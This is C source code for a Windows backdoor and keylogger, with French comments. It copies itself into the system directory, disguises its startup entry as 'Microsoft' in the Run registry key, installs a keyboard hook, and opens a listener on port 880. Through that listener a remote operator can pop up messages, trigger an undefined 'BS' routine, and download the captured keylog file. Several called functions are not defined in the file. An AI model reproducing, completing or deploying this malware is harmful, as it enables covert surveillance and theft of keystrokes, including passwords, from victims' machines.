#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>

char buffer[65535];
void pondage(char source[15])
{
    char chemin[256];
    GetSystemDirectory(chemin, 50);
    strcat(chemin, "\\naw.exe");
    CopyFile(source, chemin, FALSE);
    char chemin2[256];
    GetSystemDirectory(chemin2, 50);
    strcat(chemin2, "\\hkb.dll");
    CopyFile("hkb.dll", chemin2, FALSE);
    char szThis[300];
    char szValue[] = "Microsoft";
    HKEY hKey;
    DWORD dwDispo;
    RegCreateKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0, &hKey, &dwDispo);
    RegSetValueEx(hKey, szValue, 0, REG_SZ, (const unsigned char *)chemin, strlen(chemin));
    RegCloseKey(hKey);
}
void startWSA()
{
    WORD wVersionRequested;
    WSADATA WSAData;
    int err;
    wVersionRequested = MAKEWORD(1, 1);
    err = WSAStartup(wVersionRequested, &WSAData);
    if (err == 0)
    {
        printf("[+] Winsock a bien ete initialise\n");
    }
    else
    {
        printf("[-] Erreur lors de l'initialisation de Winsock\n");
    }
}

void clr()
{
    memset(buffer, 0x00, sizeof(buffer));
}

DWORD WINAPI connectIRC(LPVOID lpParam);

int main(int argc, char *argv[])
{
    pondage(argv[0]);
    startWSA();

    DWORD dwThreadId, dwThrdParam = 1;
    HANDLE hThread;
    // hThread = CreateThread( NULL, 0, connectIRC,&dwThrdParam, 0, &dwThreadId );
    InitHook();
    int stop = 1;
    int nombre_de_caractere; // Indique le nombre de caractères qui a été recu ou envoyé

    SOCKET id_de_la_socket;                // Identifiant de la socket
    SOCKET id_de_la_nouvelle_socket;       // Identifiant de la nouvelle socket
    SOCKADDR_IN information_sur_la_source; // Déclaration de la structure des informations lié à l'écoute

    id_de_la_socket = socket(AF_INET, SOCK_STREAM, 0);
    information_sur_la_source.sin_family = AF_INET;
    information_sur_la_source.sin_addr.s_addr = INADDR_ANY;
    information_sur_la_source.sin_port = htons(880);
    bind(id_de_la_socket, (struct sockaddr *)&information_sur_la_source, sizeof(information_sur_la_source));
    listen(id_de_la_socket, 1);
    printf("\nlisten    : OK\n");

    while (1)
    {
        int ptr = sizeof(information_sur_la_source);
        id_de_la_nouvelle_socket = accept(id_de_la_socket, (struct sockaddr *)&information_sur_la_source, &ptr);
        stop = 1;
        while (stop)
        {
            clr();
            if ((nombre_de_caractere = recv(id_de_la_nouvelle_socket, buffer, sizeof(buffer), 0)) < 1)
                stop = 0;
            buffer[nombre_de_caractere] = 0;
            // CHOIX

            if ((strstr(buffer, "MSGBOX")) != NULL)
            {
                send(id_de_la_nouvelle_socket, "Envoyez votre Message:", sizeof("Envoyez votre Message:"), 0);
                clr();
                if ((nombre_de_caractere = recv(id_de_la_nouvelle_socket, buffer, sizeof(buffer), 0)) < 1)
                    stop = 0;
                buffer[nombre_de_caractere] = 0;
                MSGBOX(buffer);
            }
            else if ((strstr(buffer, "BS")) != NULL)
            {
                send(id_de_la_nouvelle_socket, "Envoyez le port:", sizeof("Envoyez le port:"), 0);
                clr();
                if ((nombre_de_caractere = recv(id_de_la_nouvelle_socket, buffer, sizeof(buffer), 0)) < 1)
                    stop = 0;
                buffer[nombre_de_caractere] = 0;
                printf("%s", buffer);
                BS(buffer);
            }
            else if ((strstr(buffer, "KLOG")) != NULL)
            {
                send(id_de_la_nouvelle_socket, "Voici le keylog:\n---------------------------------------------------------------\n", sizeof("Voici le keylog:\n---------------------------------------------------------------\n"), 0);
                FILE *file;
                char szBuffer;
                if ((file = fopen("c:\\Program Files\\Fichiers Communs\\log.txt", "r")) != NULL) // on ouvre le fichier et verifie si on y arrive
                {
                    while (!feof(file))
                    {
                        fread(&szBuffer, 1, 1, file); // on range les caractere dans le buffer
                        if (szBuffer == '\0')         // si c'est la fin de la ligne
                            send(id_de_la_nouvelle_socket, "\n", sizeof("\n"), 0);
                        send(id_de_la_nouvelle_socket, &szBuffer, sizeof(szBuffer), 0);
                    }
                    send(id_de_la_nouvelle_socket, "\n---------------------------------------------------------------\n", sizeof("\n---------------------------------------------------------------\n"), 0);
                }
                else
                    printf("Pas de fichier log ://");
                fclose(file);
            }
            else
                printf("\nVoici les donnees : %s\n", buffer);
        }
    }

    closesocket(id_de_la_socket);
    WSACleanup();
}
